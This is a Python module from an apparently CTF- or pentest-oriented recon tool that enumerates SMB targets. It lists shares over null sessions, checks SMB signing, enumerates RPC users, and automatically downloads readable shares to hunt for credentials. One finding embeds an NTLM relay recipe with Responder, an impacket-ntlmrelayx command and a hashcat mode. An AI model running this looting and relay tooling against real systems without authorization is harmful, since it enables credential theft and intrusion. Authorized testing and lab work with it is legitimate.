"""SMB / NetBIOS enrichment.

Pure-Python SMB is heavy, so this module drives external tooling when
present (smbclient, nmblookup, enum4linux, rpcclient) and degrades quietly
when it is not. The goal is to surface null-session shares and hostnames.
"""

from __future__ import annotations

import re

from ...core import utils, tooling
from ...core.report import HostReport, Finding
from .. import crack


def enrich(host: HostReport, port: int) -> None:
    ip = host.resolved_ip
    utils.section(f"SMB {ip}:{port}")

    _nmblookup(host, ip)
    _signing_check(host, ip, port)
    shares = _list_shares(host, ip)
    if shares:
        _null_read_check(host, ip, port, shares)
    _rpc_users(host, ip, port)

    if not utils.have("smbclient") and not utils.have("nmblookup"):
        utils.log("dim", "no smbclient/nmblookup on PATH — install to enum shares",
                  indent=2)


def _signing_check(host: HostReport, ip: str, port: int) -> None:
    """Report SMB signing status. Signing NOT required == the box is a valid
    NTLM-relay target, which turns any Responder-captured auth into code exec
    without ever cracking a hash."""
    nxc = tooling.resolve("netexec") or tooling.resolve("crackmapexec")
    if not nxc:
        return
    rc, out, err = utils.run([nxc, "smb", ip], timeout=25)
    blob = (out or "") + (err or "")
    m = re.search(r"signing\s*[:=]\s*(True|False)", blob, re.I)
    if not m:
        return
    required = m.group(1).lower() == "true"
    if required:
        utils.log("dim", "SMB signing required (not relayable)", indent=2)
        host.add(Finding(
            title="SMB signing required",
            detail="Signing is enforced — NTLM relay to this host will fail.",
            severity="info", category="service", port=port, service="smb"))
    else:
        utils.log("hot", "SMB signing NOT required — NTLM relay target", indent=2)
        host.add(Finding(
            title="SMB signing not required — NTLM relay possible",
            detail="This host does not enforce SMB signing, so it is a valid "
                   "target for NTLM relay. On the local segment, run Responder "
                   "to poison LLMNR/NBT-NS and capture NetNTLMv2 auth, then "
                   "relay it here with ntlmrelayx (SMB/HTTP off in Responder): "
                   f"impacket-ntlmrelayx -t smb://{ip} -smb2support -c whoami. "
                   "See notes/responder.md. Also crackable offline: hashcat -m 5600.",
            severity="medium", category="service", port=port, service="smb",
            confidence="potential", evidence=blob[:400]))


def _nmblookup(host: HostReport, ip: str) -> None:
    if not utils.have("nmblookup"):
        return
    rc, out, _ = utils.run(["nmblookup", "-A", ip], timeout=20)
    if rc != 0 or not out:
        return
    for line in out.splitlines():
        m = re.match(r"\s*(\S+)\s+<00>", line)
        if m and "GROUP" not in line:
            name = m.group(1).strip()
            if host.add_hostname(name):
                utils.log("good", f"NetBIOS name: {utils.c(name, utils.C.CYAN)}",
                          indent=2)


def _list_shares(host: HostReport, ip: str):
    if not utils.have("smbclient"):
        return []
    # Null session listing.
    rc, out, err = utils.run(
        ["smbclient", "-N", "-L", f"//{ip}/"], timeout=30)
    blob = out + err
    shares = []
    for line in blob.splitlines():
        m = re.match(r"\s*(\S+)\s+(Disk|IPC|Printer)\s*(.*)", line, re.IGNORECASE)
        if m:
            share = m.group(1)
            if share.lower() in ("sharename",):
                continue
            shares.append(share)
    if shares:
        utils.log("good", f"null-session share listing: {', '.join(shares)}", indent=2)
        host.add(Finding(
            title="SMB shares listable via null session",
            detail=", ".join(shares), severity="medium",
            category="service", port=port_of(host), service="smb",
        ))
    return shares


def port_of(host: HostReport) -> int:
    for p in host.open_ports:
        if p["port"] in (445, 139):
            return p["port"]
    return 445


def _null_read_check(host: HostReport, ip: str, port: int, shares) -> None:
    skip = ("IPC$", "PRINT$", "ADMIN$", "C$", "SYSVOL", "NETLOGON")
    interesting = [s for s in shares if s.upper() not in skip]
    for share in interesting[:8]:
        rc, out, err = utils.run(
            ["smbclient", "-N", f"//{ip}/{share}", "-c", "ls"], timeout=25)
        blob = (out + err).lower()
        if rc == 0 and "nt_status_access_denied" not in blob and "tree connect failed" not in blob:
            utils.log("hot", f"readable share //{ip}/{share} (null session)", indent=2)
            host.add(Finding(
                title=f"Readable SMB share (null session): {share}",
                detail="Anonymous read access — enumerate for creds/flags.",
                severity="high", category="service", port=port, service="smb",
                evidence=out[:400],
            ))
            _loot_share(host, ip, port, share)


def _loot_share(host: HostReport, ip: str, port: int, share: str, cred=None) -> None:
    """Recursively download a readable share and scan every file for creds/flags
    (config files, .dtsConfig, web.config, backups). This is the classic Windows
    foothold — HTB Archetype's backups share hides prod.dtsConfig with the MSSQL
    password."""
    import os
    dest = os.path.join(crack.loot_dir(host), "smb", re.sub(r"\W+", "_", share))
    os.makedirs(dest, exist_ok=True)
    auth = ["-U", f"{cred[0]}%{cred[1]}"] if cred else ["-N"]
    script = f"lcd {dest}; prompt OFF; recurse ON; mget *"
    utils.log("info", f"looting //{ip}/{share} -> {dest}", indent=3)
    utils.run(["smbclient"] + auth + [f"//{ip}/{share}", "-c", script], timeout=120)
    crack.scan_dir(host, dest, port=port, service="smb")


def _rpc_users(host: HostReport, ip: str, port: int) -> None:
    if not utils.have("rpcclient"):
        return
    rc, out, _ = utils.run(
        ["rpcclient", "-U", "", "-N", ip, "-c", "enumdomusers"], timeout=25)
    users = re.findall(r"user:\[([^\]]+)\]", out or "")
    if users:
        utils.log("hot", f"RPC null session — users: {', '.join(users)}", indent=2)
        host.add(Finding(
            title="SMB users enumerated via RPC null session",
            detail=", ".join(users), severity="high",
            category="cred", port=port, service="smb",
        ))
